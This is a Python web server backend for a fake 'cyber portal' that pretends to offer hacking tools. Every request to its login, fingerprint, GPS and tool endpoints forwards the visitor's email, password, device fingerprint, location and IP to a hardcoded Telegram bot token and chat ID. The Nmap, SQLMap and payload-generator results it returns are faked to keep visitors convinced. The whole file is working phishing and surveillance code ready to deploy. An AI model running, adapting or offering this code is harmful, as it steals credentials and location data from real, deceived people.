from http.server import SimpleHTTPRequestHandler, HTTPServer
import json
import datetime
import requests
import os

TELEGRAM_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U"
TELEGRAM_CHAT_ID = "2005892579"

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

class CyberPortalHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path in ['/log_action', '/login', '/fingerprint', '/gps']:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            real_ip = data.get('real_ip', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.path == '/login':
                email = data.get('email')
                password = data.get('password')
                send_telegram(f"🚨 *LOGIN CAPTURED!*\n📧 {email}\n🔑 {password}\n🌐 {real_ip}\n📱 {user_agent}")
            
            elif self.path == '/fingerprint':
                fp = data.get('fingerprint')
                send_telegram(f"🕵️ *DEVICE FINGERPRINT*\n🌐 {real_ip}\n💻 Info: {fp}")

            elif self.path == '/gps':
                lat = data.get('lat')
                lon = data.get('lon')
                send_telegram(f"📍 *LOCATION CAPTURED!*\n🌐 {real_ip}\n🗺️ https://www.google.com/maps?q={lat},{lon}")
            
            elif self.path == '/log_action':
                tool = data.get('tool')
                target = data.get('target')
                send_telegram(f"🔴 *TOOL USED!*\n🌐 IP: {real_ip}\n🛠️ Tool: {tool}\n🎯 Target: {target}")
                
                # محاكاة مقنعة جداً
                output = f"[*] Initializing {tool} v4.2.1...\n[*] Target: {target}\n[+] Resolving hostname...\n"
                if tool == "Nmap Scan":
                    output += "[+] Nmap scan report for target\n[+] PORT 22/tcp open ssh\n[+] PORT 80/tcp open http\n[+] PORT 443/tcp open https\n[+] OS Detection: Linux 4.x\n[+] Scan completed."
                elif tool == "SQLMap":
                    output += "[+] Testing connection to target URL\n[+] Testing for SQL Injection...\n[!] Parameter 'id' is vulnerable.\n[+] Type: UNION query\n[+] Database: MySQL 5.7\n[+] Tables extracted: users, admin, logs"
                elif tool == "IP Geolocation":
                    r = requests.get(f"http://ip-api.com/json/{target}").json()
                    output = json.dumps(r, indent=4)
                elif tool == "Phone Info":
                    output = f"[!] OSINT RESULT\n[+] Target: {target}\n[+] Status: ACTIVE\n[+] Data: Linked accounts found."
                elif tool == "Payload Generator":
                    output = "[*] Generating reverse shell payload...\n[+] Payload obfuscation successful.\n[+] File: update.exe\n[+] Download link sent to your email."
                else:
                    output += "[+] Vulnerability detected (Simulated)\n[+] Exploit executed successfully."

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok", "output": output}).encode())
                return
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), CyberPortalHandler)
    print(f"[*] CYBER PORTAL LIVE ON PORT {port}...")
    server.serve_forever()
